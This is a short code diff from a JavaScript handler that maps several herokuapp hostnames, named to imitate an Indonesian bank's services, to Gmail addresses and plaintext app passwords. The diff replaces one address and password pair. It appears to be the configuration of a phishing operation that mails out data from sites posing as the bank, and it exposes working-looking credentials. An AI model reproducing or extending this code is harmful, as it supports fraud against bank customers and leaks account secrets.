@@ -13,8 +13,8 @@ export default function handler(req, res) {
         pass = 'ahghpmbdwokimqim'; 
 
     } else if(url == 'tarifbri-baru-lama.herokuapp.com'){
-        email = 'andin1234zx@gmail.com' ;
-        pass = 'ujnjjdjcumttwjsu' ;
+        email = 'jakarta12zx@gmail.com' ;
+        pass = 'ijrwylcjdzswcfnj' ;
 
     } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
         email = 'brigacor80@gmail.com';
